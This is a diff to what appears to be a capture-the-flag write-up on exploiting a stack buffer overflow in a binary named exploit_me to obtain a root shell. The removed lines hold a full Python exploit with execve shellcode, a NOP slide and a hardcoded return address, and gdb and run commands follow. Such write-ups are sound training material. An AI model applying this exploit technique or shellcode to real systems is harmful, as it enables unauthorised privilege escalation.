@@ -13,20 +13,7 @@ We need to add some `NOP slide` before our shellcode to be sure that even if our
 > Buffer beginning =>0xbffff6d0
 > EIP - Buffer beginning = 140
 
-Let's build our input with a python script `exploit.py`:
-
-```python
-import struct
-overflow_offset = 140
-beggining_of_nop_slide = 0xbffff640
-
-shellcode = "\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"
-shellcode_len = len(shellcode)
-NOP = "\x90" * (overflow_offset - shellcode_len - 30)
-NOP2 = "\x90" * 30
-EIP = struct.pack("I", (beggining_of_nop_slide + len(NOP) / 2))
-print NOP + shellcode + NOP2 + EIP
-```
+Let's build our input with a python script `shellcode_exploit.py` and get the `start_of_nop_slide` value with gdb:
 
 ```bash
 zaz@BornToSecHackMe:~$ gdb -q ./exploit_me
@@ -54,7 +41,7 @@ Dump of assembler code for function main:
    0x08048436 <+66>:    leave
    0x08048437 <+67>:    ret
 End of assembler dump.
-(gdb) b *0x08048425
+(gdb) b *main+49
 Breakpoint 1 at 0x8048425
 (gdb) r `python exploit.py`
 Starting program: /home/zaz/exploit_me `python exploit.py`
@@ -77,4 +64,6 @@ Argument required (starting display address).
 
 Now we can edit our script by putting the `EIP` in the middle of the `NOP_SLIDE`  and simply use our script to get access to the root shell:
 
-`python exploit.py | ./exploit_me`
+```bash
+./exploit_me `python exploit.py`
+```
